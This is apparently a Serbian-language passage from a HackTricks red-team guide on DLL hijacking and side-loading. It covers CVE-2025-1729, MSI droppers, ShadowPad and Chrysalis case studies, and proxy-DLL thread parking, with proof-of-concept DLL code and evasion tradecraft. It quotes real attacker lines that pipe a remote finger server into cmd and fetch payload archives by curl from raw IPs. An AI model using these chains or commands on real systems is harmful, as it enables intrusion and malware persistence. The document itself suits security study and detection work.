Ovaj primer demonstrira **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), praćeno kao **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` lociran u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se pokreće svakog dana u 9:30 AM pod kontekstom ulogovanog korisnika.
- **Directory Permissions**: Upisiv od strane `CREATOR OWNER`, što omogućava lokalnim korisnicima da ubace proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava prvo da učita `hostfxr.dll` iz svog working directory-ja i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na prednost lokalne pretrage direktorijuma.

### Exploit Implementation

Napadač može da postavi zlonamerni `hostfxr.dll` stub u isti direktorijum, iskorišćavajući nedostajući DLL da postigne code execution pod korisničkim kontekstom:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kao standard user, ubaci `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekaj da scheduled task pokrene u 9:30 AM u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, malicious DLL se izvršava u administratorovoj sesiji sa medium integrity.
4. Poveži standard UAC bypass tehnike da bi eskalirao sa medium integrity na SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading da izvrše payload-ove pod trusted, signed process.

Chain overview
- Korisnik preuzima MSI. CustomAction se tiho izvršava tokom GUI install-a (npr. LaunchApplication ili VBScript action), rekonstruišući sledeći stage iz embedded resources.
- Dropper upisuje legitimate, signed EXE i malicious DLL u isti direktorijum (primer: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se signed EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working directory-ja, izvršavajući attacker code pod signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Traži unose koji pokreću executables ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava embedded file u background.
- U Orca (Microsoft Orca.exe), proveri CustomAction, InstallExecuteSequence i Binary tables.
- Embedded/split payloads u MSI CAB:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Ili koristi lessmsi: `lessmsi x package.msi C:\out`
- Traži više malih fragmenata koji se konkateniraju i decrypt-uju pomoću VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading sa wsc_proxy.exe
- Drop ova dva fajla u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: napadačev DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravi proxy DLL i prosledi potrebne exports na genuinu biblioteku dok se payload izvršava u DllMain.
- Napravi minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export, koristite proxying framework (npr. DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na DLL name resolution od strane host binary-ja. Ako host koristi absolute paths ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS i forwarded exports mogu uticati na precedence i moraju se uzeti u obzir tokom izbora host binary-ja i export seta.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad koristeći **three-file triad** da bi se stopio sa legitimnim softverom, dok core payload ostaje encrypted na disku:

1. **Signed host EXE** – zloupotrebljavaju se vendor-i kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju executable da izgleda kao Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje validan.
2. **Malicious loader DLL** – postavlja se pored EXE sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan ScatterBrain framework-om; njegov jedini posao je da pronađe encrypted blob, decryptuje ga i reflective map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping decrypted payload-a, loader briše TMP fajl da uništi forensic evidence.

Tradecraft notes:

* Preimenovanje signed EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava da se predstavlja kao Windows binary, a da zadrži vendor signature, zato replicirajte naviku Ink Dragon-a da postavlja binary-je koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA utility-ji.
* Pošto executable ostaje trusted, većini allowlisting kontrola je dovoljno da vaš malicious DLL stoji pored njega. Fokusirajte se na prilagođavanje loader DLL-a; signed parent obično može da se pokreće neizmenjen.
* ShadowPad decryptor očekuje da TMP blob bude pored loader-a i da bude writable, kako bi mogao da obriše fajl nakon mapiranja. Zadržite direktorijum writable dok se payload ne učita; kada je jednom u memoriji, TMP fajl se može bezbedno obrisati zbog OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatori kombinuju DLL sideloading sa LOLBAS tako da je jedini custom artifact na disku malicious DLL pored trusted EXE-a:

- **Remote command loader (Finger):** Hidden PowerShell pokreće `cmd.exe /c`, preuzima komande sa Finger servera i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima TCP/79 text; `| cmd` izvršava odgovor servera, što operatorima omogućava da menjaju second stage server-side.

- **Built-in download/extract:** Preuzmite archive sa benign ekstenzijom, raspakujte ga i postavite sideload target plus DLL u nasumični `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progres i prati redirects; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI tako da telemetry pokazuje CIM-created process dok učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binary-jima koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) radi pod trusted imenom.

- **Hunting:** Alert na `forfiles` kada se `/p`, `/m` i `/c` pojave zajedno; neuobičajeno je van admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavna Lotus Blossom intruzija zloupotrebila je trusted update chain da isporuči NSIS-packed dropper koji je postavio DLL sideload plus fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, ubacuje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE importuje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decryptuje custom LCG-based stream-om (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa temp fajlove i skače na njega.
- Da bi izbegao IAT, loader resolve-uje API-je hashovanjem export names koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi sa salted target hash-evima.

Main shellcode (Chrysalis)
- Decryptuje PE-like main module ponavljanjem add/XOR/sub sa key-jem `gQ2JR&9;` kroz pet prolaza, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da dovrši import resolution.
- Rekonstruiše DLL name strings u runtime-u preko per-character bit-rotate/XOR transformacija, zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku export table u 4-byte blokovima sa Murmur-style mixing-om i vraća se na `GetProcAddress` samo ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` fajla na **offset 0x30808** (veličina **0x980**) i RC4-decrypt-uje se sa key-jem `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beacons grade host profile razdvojen tačkama, dodaju tag `4Q`, zatim RC4-encrypt-uju sa key-jem `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS. Odgovori se RC4-decrypt-uju i prosleđuju preko tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode je kontrolisan CLI args: bez argumenata = instalira persistence (service/Run key) koji pokazuje na `-i`; `-i` ponovo pokreće sebe sa `-k`; `-k` preskače instalaciju i pokreće payload.

Alternate loader observed
- Ista intruzija je postavila Tiny C Compiler i izvršila `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C source koji je ubacio napadač sadržao je shellcode, kompajlirao ga i pokrenuo in-memory bez dodirivanja diska sa PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza je učitala `Wininet.dll` u runtime-u i povukla second-stage shellcode sa hardcoded URL-a, dajući fleksibilan loader koji se predstavlja kao compiler run.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains dodaju **stability engineering** tako da legitimate host ostane alive dovoljno dugo da učita kasnije faze čisto, umesto da crash-uje nakon što se malicious DLL učita.

Observed pattern
- Drop trusted EXE pored malicious DLL koristeći očekivano dependency ime kao što je `version.dll`.
- Malicious DLL **proxy-uje svaki očekivani export** nazad na real system DLL (na primer `%SystemRoot%\\System32\\version.dll`) tako da import resolution i dalje uspeva i host process nastavlja da radi.
- After load, malicious DLL **patch-uje host entry point** tako da main thread upadne u infinite `Sleep` loop umesto da izađe ili pokrene code paths koji bi terminisali process.
- Novi thread obavlja stvarni malicious posao: decrypting next-stage DLL name ili path (RC4/XOR su common), zatim ga pokreće sa `LoadLibrary`.

Why this matters
- Normal DLL proxying čuva API compatibility, ali ne garantuje da će host ostati alive dovoljno dugo za kasnije faze.
- Parking main thread u `Sleep(INFINITE)` je jednostavan način da signed process ostane resident dok loader obavlja decryption, staging, ili network bootstrap u worker thread-u.
- Hunting samo za suspicious `DllMain` promašuje ovaj pattern ako se interesantno ponašanje dešava nakon što se host entry point patch-uje i secondary thread startuje.

Minimal workflow
1. Kopiraj signed host EXE i odredi DLL koji resolve-uje iz local directory-ja.
2. Izgradi proxy DLL koji export-uje iste funkcije i forward-uje ih na legitimate DLL.
3. U `DllMain(DLL_PROCESS_ATTACH)`, kreiraj worker thread.
4. Iz tog threada, patch-uj host entry point ili main thread start routine tako da loop-uje na `Sleep`.
5. Decrypt-uj next-stage DLL name/config i pozovi `LoadLibrary` ili manual-map payload.

Defensive pivots
- Signed processes koji učitavaju `version.dll` ili slične common libraries iz svog application directory-ja umesto iz `System32`.
- Memory patches na process entry point-u ubrzo nakon image load-a, posebno jumps/calls preusmereni na `Sleep`/`SleepEx`.
- Threads kreirani od strane proxy DLL-a koji odmah pozivaju `LoadLibrary` na second DLL sa decrypted name-om.
- Full-export proxy DLL-ovi postavljeni pored vendor executables unutar writable staging directories kao što su `ProgramData`, `%TEMP%`, ili unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
